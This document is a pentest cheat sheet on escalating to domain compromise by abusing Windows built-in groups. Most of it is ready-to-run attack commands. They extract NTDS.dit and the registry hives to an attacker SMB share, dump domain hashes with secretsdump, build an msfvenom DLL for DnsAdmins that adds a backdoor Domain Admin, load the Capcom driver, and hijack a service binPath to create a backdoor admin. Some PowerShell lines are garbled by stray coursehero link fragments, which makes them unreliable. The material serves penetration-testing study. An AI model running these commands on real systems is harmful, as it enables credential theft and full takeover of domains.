## Windows Built-in Groups

Several Windows built-in groups grant members elevated privileges that, while not equivalent to Domain Admin, can be chained together to achieve full domain compromise. These groups are often populated carelessly, either to support backup software, third-party applications, or through leftover test accounts. 

***

## Backup Operators

Members receive `SeBackupPrivilege` and `SeRestorePrivilege`, and can log on locally to Domain Controllers. This combination is effectively equivalent to Domain Admin because it allows complete extraction of the AD credential database. 

### Confirming Membership and Enabling the Privilege

```cmd
:: Confirm group membership
whoami /groups | findstr "Backup"

:: Check privileges (will show Disabled initially)
whoami /priv
```

```powershell
# Method 1: SeBackupPrivilege DLL from giuliano108 PoC
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# Method 2: EnableAllTokenPrivs script
Import-Module .\EnableAllTokenPrivs.ps1
.\EnableAllTokenPrivs.ps1

# Verify it is now Enabled
whoami /priv | findstr SeBackupPrivilege
```

### Path 1: Copy Protected Files Directly

```powershell
# Standard cat / copy will fail with Access Denied
# SeBackupPrivilege bypasses NTFS ACL checks via FILE_FLAG_BACKUP_SEMANTICS

# Using the SeBackupPrivilege cmdlet
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

# Using robocopy /B (backup mode - no external tools needed)
robocopy /B C:\Confidential\ .\output\ "2021 Contract.txt"
```

### Path 2: Extract NTDS.dit from a Domain Controller

```powershell
# Step 1: Create a shadow copy of C: and expose it as E: using diskshadow
# Write the commands to a script file first (diskshadow requires a script when run non-interactively)

$script = @"
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
"@
$script | Out-File -FilePath C:\Windows\Temp\shadow.txt -Encoding ASCII

diskshadow.exe /s C:\Windows\Temp\shadow.txt

# Step 2: Verify shadow copy was mounted
dir E:\

# Step 3: Copy NTDS.dit using backup semantics
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit

# Alternative: robocopy /B (no extra modules needed)
robocopy /B E:\Windows\NTDS\ C:\Windows\Temp\ntds\ ntds.dit

# Step 4: Dump SAM and SYSTEM hives
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.SAV
reg save HKLM\SAM C:\Windows\Temp\SAM.SAV
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.SAV

# Step 5: Transfer files to attack machine
# SMB server method:
# On attack machine: impacket-smbserver share . -smb2support
copy C:\Windows\Temp\ntds.dit \\10.10.14.3\share\
copy C:\Windows\Temp\SYSTEM.SAV \\10.10.14.3\share\
```

### Path 3: Extract Credentials from NTDS.dit (Offline)

```bash
# Method 1: secretsdump.py (Impacket) - extracts all domain hashes
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL

# Output format: username:RID:LMhash:NThash:::
# Administrator:500:aad3b435b51404ee...:cf3a5525ee9414229e66279623ed5c58:::
# krbtgt:502:aad3b435b51404ee...:a05824b8c279f2eb31495a012473d129:::

# Method 2: DSInternals PowerShell module (single account)
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM.SAV
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

# Method 3: DSInternals - dump all accounts
Get-ADDBAccount -All -DBPath .\ntds.dit -BootKey $key | Format-Custom -View HashcatNT
```

***

## Event Log Readers

Members can read Windows event logs on any domain controller, which is valuable for hunting credentials that get logged in process creation events. Administrators sometimes pass credentials directly on the command line, which gets captured in event 4688. 

```powershell
# Confirm membership
net localgroup "Event Log Readers"

# Search Security log for process creation events containing /user (password passed in cleartext)
Get-WinEvent -LogName security | where {
    $_.ID -eq 4688 -and $_.Properties [coursehero](https://www.coursehero.com/file/253441682/SeBackupPrivilegepdf/).Value -like '*/user*'
} | Select-Object TimeCreated, @{Name='CmdLine';Expression={$_.Properties [coursehero](https://www.coursehero.com/file/253441682/SeBackupPrivilegepdf/).Value}}

# Search for password strings in process creation events
Get-WinEvent -LogName security | where {$_.ID -eq 4688} |
    Select-Object @{Name='CmdLine';Expression={$_.Properties [coursehero](https://www.coursehero.com/file/253441682/SeBackupPrivilegepdf/).Value}} |
    Where-Object {$_.CmdLine -match "pass|pwd|cred|secret|key"}

# Using wevtutil (cmd.exe compatible, no PowerShell needed)
wevtutil qe Security /q:"*[EventData[Data[@Name='CommandLine'] and contains(Data, '/user')]]" /f:text
```

***

## DnsAdmins

Members can load an arbitrary DLL into the DNS service which runs as `NT AUTHORITY\SYSTEM` on Domain Controllers.

```powershell
# Confirm membership
net localgroup "DnsAdmins"

# Step 1: Create malicious DLL on attack machine
# DLL executes a command when loaded (e.g. add backdoor admin user)
msfvenom -p windows/x64/exec cmd='net user hacker Pass1! /add && net group "Domain Admins" hacker /add /domain' -f dll -o evil.dll

# Step 2: Host DLL on SMB share accessible from the DC
impacket-smbserver share . -smb2support

# Step 3: Configure DNS server to load the DLL
dnscmd.exe /config /serverlevelplugindll \\10.10.14.3\share\evil.dll

# Step 4: Restart DNS service (requires membership in DnsAdmins)
sc stop dns
sc start dns

# Cleanup: remove the DLL reference
dnscmd.exe /config /serverlevelplugindll ""
sc restart dns
```

Note: Loading a malicious DLL will crash the DNS service. In a production environment this causes DNS resolution to fail for the entire domain. Always discuss this risk with the client before proceeding.

***

## Print Operators

Members have `SeLoadDriverPrivilege` and can log on locally to Domain Controllers. Loading a malicious kernel driver achieves Ring 0 code execution.

```powershell
# Confirm membership
net localgroup "Print Operators"

# SeLoadDriverPrivilege is not visible in non-elevated context
# Requires elevated CMD/PowerShell - UAC bypass needed first if not already elevated

# Step 1: Enable SeLoadDriverPrivilege
.\EnableAllTokenPrivs.ps1
whoami /priv | findstr SeLoadDriverPrivilege

# Step 2: Create a registry key for the driver
reg add HKCU\System\CurrentControlSet\Capcom /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\Capcom /v Type /t REG_DWORD /d 1

# Step 3: Load the vulnerable driver and exploit
.\ExploitCapcom.exe
```

***

## Server Operators

Exists only on Domain Controllers. Members can modify service binaries, start/stop services, and access SMB shares. Replacing a service binary running as SYSTEM is the most reliable path: 

```cmd
:: Check current service binary
sc qc AppReadiness

:: Use PsService to inspect permissions (confirm Server Operators has full control)
PsService.exe security AppReadiness

:: Change service binary to a malicious command
sc config AppReadiness binPath= "cmd /c net user hacker Pass1! /add && net localgroup Administrators hacker /add"

:: Start the service (runs the command as SYSTEM, then fails - that is expected)
sc start AppReadiness

:: Verify the backdoor user was added
net user hacker
net localgroup Administrators

:: Restore the service afterward
sc config AppReadiness binPath= "C:\Windows\System32\AppReadiness.dll"
```

***

## Hyper-V Administrators

If virtual Domain Controllers exist, Hyper-V Administrators have full control over those VMs and should be treated as effective Domain Admins.

```powershell
# Confirm membership
net localgroup "Hyper-V Administrators"

# Export/clone a DC VM to read its virtual disk
# PowerShell Hyper-V module
Get-VM | Select-Object Name, State
Export-VM -Name "DC01" -Path "C:\Exports\"

# Mount the exported VHDX file and extract credentials
Mount-VHD -Path "C:\Exports\DC01\Virtual Hard Disks\DC01.vhdx"
# NTDS.dit and SYSTEM hive are now accessible on a new drive letter
```

***

## Rapid Group Membership Check

Run this immediately after landing on any Windows host to identify high-value group memberships: 

```powershell
# Check current user's groups for any of the dangerous groups
whoami /groups | findstr /i "Backup Operators\|Server Operators\|Print Operators\|DnsAdmins\|Event Log Readers\|Hyper-V"

# Enumerate membership of all interesting groups
$groups = "Backup Operators","Server Operators","Print Operators","DnsAdmins","Event Log Readers","Hyper-V Administrators","Remote Desktop Users","Remote Management Users"
foreach ($g in $groups) {
    Write-Host "`n[*] $g" -ForegroundColor Cyan
    net localgroup $g 2>$null
}
```
